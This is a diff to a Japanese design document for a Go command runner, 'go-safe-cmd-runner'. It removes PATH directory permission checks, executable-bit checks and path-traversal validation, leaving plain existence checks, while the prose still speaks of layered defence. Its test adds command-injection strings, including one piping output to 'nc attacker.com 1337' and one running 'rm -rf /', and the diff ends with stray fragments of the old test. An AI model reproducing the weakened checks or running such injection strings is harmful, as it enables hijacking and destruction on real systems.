@@ -214,9 +214,10 @@ func (pr *PathResolver) ResolvePath(command string) (string, error) {
 
     // 3. PATH環境変数から解決
     for _, dir := range strings.Split(pr.pathEnv, ":") {
-        // 4. 各PATHディレクトリのセキュリティ検証
-        if err := pr.security.ValidateDirectoryPermissions(dir); err != nil {
-            continue // 不安全なディレクトリはスキップ
+        // 4. ディレクトリの存在と読み取り権限の確認（厳格なパーミッションチェックなし）
+        if !pr.canAccessDirectory(dir) {
+            slog.Debug("Skipping inaccessible directory", "directory", dir)
+            continue // アクセスできないディレクトリはスキップ
         }
 
         // 5. コマンドファイルの存在確認
@@ -232,86 +233,22 @@ func (pr *PathResolver) ResolvePath(command string) (string, error) {
         }
 
         if info, err := os.Stat(fullPath); err == nil && !info.IsDir() {
-            // 実行権限確認
-            if info.Mode()&0111 != 0 {
-                return fullPath, nil
-            }
+            // 実行ファイルの存在確認のみ（パーミッションチェックなし）
+            return fullPath, nil
         }
     }
 
-    return "", fmt.Errorf("command not found in secure PATH: %s", command)
+    return "", fmt.Errorf("command not found in PATH: %s", command)
 }
 
-// パストラバーサル攻撃の検証
-func (pr *PathResolver) validateCommandSafety(command string) error {
-    // 1. NULLバイト攻撃の検出
-    if strings.Contains(command, "\x00") {
-        return fmt.Errorf("command contains null bytes")
-    }
-
-    // 2. パストラバーサル文字列の検出
-    if strings.Contains(command, "..") {
-        return fmt.Errorf("command contains path traversal sequences")
-    }
-
-    // 3. パス区切り文字の検証（相対パスコマンドではスラッシュは不正）
-    if strings.Contains(command, "/") && !filepath.IsAbs(command) {
-        return fmt.Errorf("relative command contains path separators")
-    }
-
-    // 4. 制御文字の検出
-    for _, r := range command {
-        if r < 32 && r != '\t' && r != '\n' && r != '\r' {
-            return fmt.Errorf("command contains control characters")
-        }
-    }
-
-    // 5. コマンド名の長さ制限
-    if len(command) > 255 {
-        return fmt.Errorf("command name too long")
-    }
-
-    return nil
-}
-
-// 解決されたパスが想定ディレクトリ内にあることを確認
-func (pr *PathResolver) isPathWithinDirectory(resolvedPath, baseDir string) bool {
-    // パスを正規化
-    cleanResolved := filepath.Clean(resolvedPath)
-    cleanBase := filepath.Clean(baseDir)
-
-    // 絶対パスに変換
-    absResolved, err := filepath.Abs(cleanResolved)
+// ディレクトリへのアクセス可能性だけを確認（厳格なパーミッションチェックなし）
+func (pr *PathResolver) canAccessDirectory(dir string) bool {
+    info, err := os.Stat(dir)
     if err != nil {
-        return false
+        return false // ディレクトリが存在しないか、アクセスできない
     }
 
-    absBase, err := filepath.Abs(cleanBase)
-    if err != nil {
-        return false
-    }
-
-    // ベースディレクトリ内にあることを確認
-    rel, err := filepath.Rel(absBase, absResolved)
-    if err != nil {
-        return false
-    }
-
-    // ../ で始まる場合はディレクトリ外
-    return !strings.HasPrefix(rel, "..")
-}
-
-func (pr *PathResolver) ShouldSkipVerification(path string) bool {
-    if !pr.skipStandardPaths {
-        return false
-    }
-
-    for _, standardPath := range pr.standardPaths {
-        if strings.HasPrefix(path, standardPath) {
-            return true
-        }
-    }
-    return false
+    return info.IsDir() // ディレクトリであることだけを確認
 }
 ```
 
@@ -538,6 +475,7 @@ internal/
 - **実行ファイル・参照ファイル**: パーミッションチェックなし（ハッシュ値比較のみ）
   - 第三者（自動実行用アカウント等）による書き込みを許可
   - 改ざんはハッシュ値で確実に検出可能
+  - ファイルの存在確認のみ行い、パーミッションや所有権は検証しない
 
 ### 4.2 検証段階とエラーハンドリング
 
@@ -558,9 +496,7 @@ internal/
       └─ 失敗: コマンドスキップ
 ```
 
-### 4.2 PATH解決のセキュリティ
-
-#### 4.2.1 パストラバーサル攻撃対策
+### 4.2.1 パストラバーサル攻撃対策
 
 **多層防御アプローチ:**
 
@@ -574,7 +510,7 @@ internal/
    - `filepath.Rel()` を使用したディレクトリ外アクセスの検出
    - 絶対パス正規化による迂回攻撃の防止
 
-3. **ディレクトリ権限検証**: PATH内の各ディレクトリの安全性確認
+3. **ディレクトリアクセス確認**: PATH内の各ディレクトリへのアクセス可能性確認（厳格な権限チェックなし）
 
 ```go
 // セキュアなPATH解決
@@ -582,11 +518,9 @@ func (pr *PathResolver) securePathResolution(command string) (string, error) {
     pathDirs := strings.Split(os.Getenv("PATH"), ":")
 
     for _, dir := range pathDirs {
-        // 1. ディレクトリ権限検証
-        if err := pr.security.ValidateDirectoryPermissions(dir); err != nil {
-            slog.Warn("Skipping insecure PATH directory",
-                "directory", dir,
-                "error", err.Error())
+        // 1. ディレクトリアクセス確認（厳格な権限チェックなし）
+        if !pr.canAccessDirectory(dir) {
+            slog.Debug("Skipping inaccessible directory", "directory", dir)
             continue
         }
 
@@ -603,37 +537,13 @@ func (pr *PathResolver) securePathResolution(command string) (string, error) {
         }
 
         if info, err := os.Stat(fullPath); err == nil && !info.IsDir() {
-            // 実行権限確認
-            if info.Mode()&0111 != 0 {
-                return fullPath, nil
-            }
+            // ファイルの存在確認のみ（パーミッションチェックなし）
+            return fullPath, nil
         }
     }
 
-    return "", fmt.Errorf("command not found in secure PATH directories: %s", command)
+    return "", fmt.Errorf("command not found in PATH directories: %s", command)
 }
-```
-
-### 4.3 ハッシュファイル保護
-
-既存の設定ファイル検証と同じセキュリティモデルを使用:
-
-```
-/usr/local/etc/go-safe-cmd-runner/hashes/
-├── config.toml.sha256           # 設定ファイル（既存）
-├── usr/
-│   ├── bin/
-│   │   ├── systemctl.sha256     # global ファイル
-│   │   └── ls.sha256            # global ファイル
-│   └── sbin/
-│       └── logrotate.sha256     # groups ファイル
-└── etc/
-    ├── ssl/certs/
-    │   └── ca-certificates.crt.sha256  # global ファイル
-    └── logrotate.conf.sha256    # groups ファイル
-
-全ファイル権限: 644 (root:root)
-全ディレクトリ権限: 755 (root:root)
 ```
 
 ## 5. パフォーマンス設計
@@ -758,22 +668,112 @@ func TestPathResolver_PathTraversalSecurity(t *testing.T) {
     security, _ := security.NewValidatorWithFS(security.DefaultConfig(), mockFS)
     pathResolver := NewPathResolver("/usr/bin", security, false)
 
-    // パストラバーサル攻撃のテストケース
-    maliciousCommands := []struct {
-        name    string
-        command string
-        reason  string
-    }{
-        {
-            name:    "basic_path_traversal",
-            command: "../../../etc/passwd",
-            reason:  "contains .. sequences",
-        },
-        {
-            name:    "relative_path_with_separator",
-            command: "../../bin/sh",
-            reason:  "relative path with separators",
-        },
+    // 攻撃シナリオ1: PATHインジェクション
+    maliciousPATH := "/tmp:/usr/bin"
+    pathResolver = NewPathResolver(maliciousPATH, security, false)
+
+    // 不安全な/tmpディレクトリは権限チェックで排除される
+    _, err := pathResolver.ResolvePath("malicious")
+    assert.Error(t, err, "Should reject commands from insecure directories")
+
+    // 攻撃シナリオ2: コマンドインジェクション試行
+    attackCommands := []string{
+        "ls; cat /etc/passwd",
+        "ls && rm -rf /",
+        "ls | nc attacker.com 1337",
+        "$(cat /etc/passwd)",
+        "`cat /etc/passwd`",
+    }
+
+    for _, cmd := range attackCommands {
+        _, err := pathResolver.ResolvePath(cmd)
+        assert.Error(t, err, "Should reject command injection attempt: %s", cmd)
+    }
+}
+```
+
+## 7. 実装フェーズ
+
+### Phase 1: 基盤機能
+- [ ] 設定ファイル拡張（global/groups の hash_files セクション）
+- [ ] runnertypes.Config 構造体拡張（SkipStandardPaths フィールド追加）
+- [ ] verification.Manager の VerifyGlobalFiles/VerifyGroupFiles メソッド
+
+### Phase 2: 検証機能
+- [ ] main.go への global 検証統合
+- [ ] runner.executeGroup への groups 検証統合
+- [ ] エラーハンドリング（global失敗→終了、groups失敗→スキップ）
+
+### Phase 3: 統合・テスト
+- [ ] PathResolver 実装（スキップ機能付き）
+- [ ] コマンド個別検証機能（標準パススキップ対応）
+- [ ] 設定ファイル・コマンドライン引数でのスキップ機能制御
+- [ ] 包括的テストスイート
+- [ ] パフォーマンステスト
+
+## 8. 運用考慮事項
+
+### 8.1 デプロイメント手順
+
+```bash
+# 1. ハッシュ記録（global ファイル）
+sudo ./build/record -file /usr/bin/systemctl -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
+sudo ./build/record -file /usr/bin/ls -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
+
+# 2. ハッシュ記録（groups ファイル）
+sudo ./build/record -file /usr/sbin/logrotate -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
+sudo ./build/record -file /etc/logrotate.conf -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
+
+# 3. 設定ファイル更新
+vi /etc/go-safe-cmd-runner/config.toml  # hash_files セクション追加
+
+# 4. 動作確認
+./runner --config /etc/go-safe-cmd-runner/config.toml
+```
+
+### 8.2 監視とロギング
+
+```go
+// 構造化ログ例
+slog.Info("Global files verification completed",
+    "verified_files", len(globalConfig.HashFiles),
+    "verification_duration_ms", duration.Milliseconds())
+
+slog.Warn("Group file verification failed, skipping group",
+    "group", group.Name,
+    "failed_file", failedFile,
+    "error", err.Error())
+
+slog.Error("Command verification failed",
+    "command", command.Cmd,
+    "resolved_path", resolvedPath,
+    "error", err.Error())
+```
+
+## 9. 将来拡張
+
+### 9.1 高度な機能
+
+- **ハッシュキャッシュ**: 同一ファイルの重複検証回避
+- **並列検証**: 複数ファイルの同時検証
+- **動的ライブラリ検証**: 実行時ロードされるライブラリの検証
+- **設定テンプレート**: 共通ファイルセットのテンプレート化
+
+### 9.2 設定拡張例
+
+```toml
+[global]
+# 既存設定...
+
+# 将来の拡張
+hash_cache_ttl = "1h"
+parallel_verification = true
+
+[[global.hash_templates]]
+name = "system_binaries"
+paths = ["/usr/bin/*", "/usr/sbin/*"]
+include_pattern = "^(systemctl|ls|cat|grep)$"
+```
         {
             name:    "null_byte_injection",
             command: "ls\x00../../../etc/passwd",
